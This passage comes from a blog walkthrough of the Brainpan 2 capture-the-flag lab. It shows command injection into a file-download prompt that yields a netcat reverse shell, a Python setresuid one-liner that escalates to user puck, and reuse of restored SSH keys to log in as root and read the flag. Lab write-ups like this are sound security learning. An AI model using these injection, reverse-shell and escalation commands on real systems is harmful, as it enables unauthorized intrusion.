  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|

  [______________________ WELCOME TO BRAINPAN 1.8________________________]
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOGIN AS GUEST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt; GUEST
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ACCESS GRANTED


  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *&nbsp; *&nbsp; *&nbsp; *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;&nbsp;&nbsp; THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.&nbsp;
  &nbsp;&nbsp;&nbsp; TYPE "TELL ME MORE" FOR A&nbsp;LIST OF COMMANDS.&nbsp;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *&nbsp; *&nbsp; *&nbsp; *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt; VIEW
  &nbsp;&nbsp;&nbsp; ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.57.1 5600
</div>

<div class="cssterm">
$ nc -l -p 5600 -v
  nc: listening on :: 5600 ...
  nc: listening on 0.0.0.0 5600 ...
  nc: connect to 192.168.57.1 5600 from 192.168.57.10 (192.168.57.10) 41003 [41003]
id
  uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)
</div>

We are almost the user "puck". There are few ways to elevate our id from 1000 to 1001.
I've show one in <a href="http://blog.pentests.pl/2014/05/linux-spawn-bash-with-id-elevation.html" target="top">this post</a>
and here's it in action:

<div class="cssterm">
python -c 'import os,pty;os.setresuid(1001,1001,1001);pty.spawn("/bin/bash");'
puck@brainpan2:/opt/old/brainpan-1.8$ whoami
  whoami
  puck
puck@brainpan2:/opt/old/brainpan-1.8$ id
  id
  uid=1001(puck) gid=1000(anansi) groups=1001(puck),50(staff),1000(anansi)
puck@brainpan2:/opt/old/brainpan-1.8$
</div>

Let's check puck's folder:
<div class="cssterm">
puck@brainpan2:/opt/old/brainpan-1.8$ cd /home
  cd /home
puck@brainpan2:/home$ cd puck
  cd puck
puck@brainpan2:/home/puck$ ls -la
  ls -la
  total 28
  drwx------ 4 puck&nbsp; puck&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 .
  drwxr-xr-x 5 root&nbsp; root&nbsp; 4096 Nov&nbsp; 4&nbsp; 2013 ..
  drwxr-xr-x 3 puck&nbsp; puck&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 .backup
  -rw------- 1 puck&nbsp; puck&nbsp;&nbsp;&nbsp;&nbsp; 0 Nov&nbsp; 5&nbsp; 2013 .bash_history
  -rw-r--r-- 1 puck&nbsp; puck&nbsp;&nbsp; 220 Nov&nbsp; 4&nbsp; 2013 .bash_logout
  -rw-r--r-- 1 puck&nbsp; puck&nbsp; 3392 Nov&nbsp; 4&nbsp; 2013 .bashrc
  -rw-r--r-- 1 puck&nbsp; puck&nbsp;&nbsp; 675 Nov&nbsp; 4&nbsp; 2013 .profile
  drwx------ 2 puck&nbsp; puck&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 .ssh
</div>

Looks clean, backup folder looks suspicious. I've checked it:

<div class="cssterm">
puck@brainpan2:/home/puck$ cd .backup
  cd .backup
puck@brainpan2:/home/puck/.backup$ ls -la
  ls -la
  total 28
  drwxr-xr-x 3 puck puck 4096 Nov&nbsp; 5&nbsp; 2013 .
  drwx------ 4 puck puck 4096 Nov&nbsp; 5&nbsp; 2013 ..
  -rw------- 1 puck puck&nbsp; 395 Nov&nbsp; 5&nbsp; 2013 .bash_history
  -rw-r--r-- 1 puck puck&nbsp; 220 Nov&nbsp; 4&nbsp; 2013 .bash_logout
  -rw-r--r-- 1 puck puck 3392 Nov&nbsp; 4&nbsp; 2013 .bashrc
  -rw-r--r-- 1 puck puck&nbsp; 675 Nov&nbsp; 4&nbsp; 2013 .profile
  drwx------ 2 puck puck 4096 Nov&nbsp; 4&nbsp; 2013 .ssh
</div>

Not empty bash_history? That's strange:

<div class="cssterm">
puck@brainpan2:/home/puck/.backup$ cat .bash_history
  cat .bash_history
  cd /usr/local/bin
  ls -l
  ./msg_root "comment on the latest version please"
  cd /opt/brainpan/
  ps aux
  vi brainpan-1.8.c
  cd ../archive
  netstat -antp
  netstat -antp | grep 9888
  cd ..
  ls
  cd old
  ls
  cd brainpan-1.8
  vi brainpan-1.8.c
  ssh -l "root " brainpan2
  vi brainpan.7
  man ./brainpan.7
  ls
  htop
  top
  ls -latr
  cat .bash_history
  ls
  mkdir .backup
  mv .ssh .bash* .backup
  cd .backup/
  ls
  clear
  ls -latr
  exit
puck@brainpan2:/home/puck/.backup$
</div>

So user puck can login on the root through ssh. After looking through folders I've done this:

<div class="cssterm">
puck@brainpan2:/home/puck$ mv .ssh .ssh-old
  mv .ssh .ssh-old
puck@brainpan2:/home/puck$ cp -rp .backup/.ssh .
  cp -rp .backup/.ssh .
puck@brainpan2:/home/puck$ ls -la
  ls -la
  total 32
  drwx------ 5 puck&nbsp; puck&nbsp;&nbsp; 4096 Jun&nbsp; 6 10:31 .
  drwxr-xr-x 5 root&nbsp; root&nbsp;&nbsp; 4096 Nov&nbsp; 4&nbsp; 2013 ..
  drwxr-xr-x 3 puck&nbsp; puck&nbsp;&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 .backup
  -rw------- 1 puck&nbsp; puck&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 Nov&nbsp; 5&nbsp; 2013 .bash_history
  -rw-r--r-- 1 puck&nbsp; puck&nbsp;&nbsp;&nbsp; 220 Nov&nbsp; 4&nbsp; 2013 .bash_logout
  -rw-r--r-- 1 puck&nbsp; puck&nbsp;&nbsp; 3392 Nov&nbsp; 4&nbsp; 2013 .bashrc
  -rw-r--r-- 1 puck&nbsp; puck&nbsp;&nbsp;&nbsp; 675 Nov&nbsp; 4&nbsp; 2013 .profile
  drwx------ 2 puck&nbsp; anansi 4096 Nov&nbsp; 4&nbsp; 2013 .ssh
  drwx------ 2 puck&nbsp; puck&nbsp;&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 .ssh-old
puck@brainpan2:/home/puck$ ssh -l "root " brainpan2
  ssh -l "root " brainpan2
  ssh: connect to host brainpan2 port 22: Connection refused
</div>

Either ssh is not running or it's running on different port.

<div class="cssterm">
puck@brainpan2:/home/puck$ cat /etc/ssh/sshd_config
  cat /etc/ssh/sshd_config
  # Package generated configuration file
  # See the sshd_config(5) manpage for details

  # What ports, IPs and protocols we listen for
  Port 2222
  ...
</div>

Got ya!

<div class="cssterm">
puck@brainpan2:/home/puck$ ssh -l "root " brainpan2 -p 2222
  ssh -l "root " brainpan2 -p 2222
  The authenticity of host '[brainpan2]:2222 ([127.0.1.1]:2222)' can't be established.
  ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
  Are you sure you want to continue connecting (yes/no)? yes
  yes
  Warning: Permanently added '[brainpan2]:2222' (ECDSA) to the list of known hosts.
  Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686

  The programs included with the Debian GNU/Linux system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.

  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  permitted by applicable law.
  Last login: Thu Nov&nbsp; 7 11:00:06 2013
root @brainpan2:~# cat /root/flag.txt
  cat /root/flag.txt

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; !!! CONGRATULATIONS !!!

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; You've completed the Brainpan 2 challenge!
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Or have you...?

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Yes, you have! Pat yourself on the back. :-)

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Questions, comments, suggestions for new VM
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; challenges? Let me know!


  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Twitter: &lt;redacted&gt;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Email&nbsp; : &lt;redacted&gt;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Web&nbsp;&nbsp;&nbsp; : http://www.techorganic.com

root @brainpan2:~#
</div>

That's all! I must say I've really enjoyed this one. There were a few times when
I wanted to grab my laptop and teach it how to fly but beating these moments gave
me a lot of satisfaction and new experiences. See you soon!
